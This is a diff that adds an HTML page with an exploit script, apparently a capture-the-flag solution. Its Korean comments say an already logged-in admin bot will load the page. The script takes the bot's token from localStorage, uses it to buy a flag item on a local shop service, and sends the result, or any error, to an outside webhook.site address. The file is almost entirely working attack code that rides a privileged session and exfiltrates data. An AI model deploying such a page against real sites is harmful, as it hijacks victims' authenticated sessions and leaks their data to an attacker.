@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // 1. 웹후크 주소 (Webhook.site에서 복사한 주소)
+        const myWebhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
+
+        // 2. 관리자 권한으로 플래그 구매 요청 (ID 4번이 플래그)
+        // 봇은 이미 관리자로 로그인된 상태이므로 localStorage에 토큰이 있을 겁니다.
+        fetch('http://localhost:3000/4/buy', {
+            method: 'POST',
+            headers: {
+                'token': localStorage.getItem('token'), // 또는 document.cookie
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(res => res.json())
+        .then(data => {
+            // 3. 구매 성공 시 서버가 준 데이터(플래그)를 웹후크로 전송
+            fetch(`${myWebhook}?flag=${encodeURIComponent(data.data)}`);
+        })
+        .catch(err => {
+            fetch(`${myWebhook}?error=${encodeURIComponent(err)}`);
+        });
+    </script>
+</body>
+</html>
